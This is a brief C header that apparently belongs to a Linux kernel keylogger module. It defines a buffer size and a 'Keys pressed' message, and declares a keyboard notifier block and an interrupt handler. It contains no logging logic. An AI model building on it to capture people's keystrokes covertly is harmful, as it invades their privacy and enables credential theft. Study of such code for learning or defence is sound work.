#ifndef __KEYBOARDLOGGER_H__
#define __KEYBOARDLOGGER_H__

#define KEY_BUFFER_SIZE 25
#define KEYLOGGER_MSG "Keys pressed: \0"

extern struct notifier_block keyboard_notifier_block;

irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id);

#endif /* __KEYBOARDLOGGER_H__ */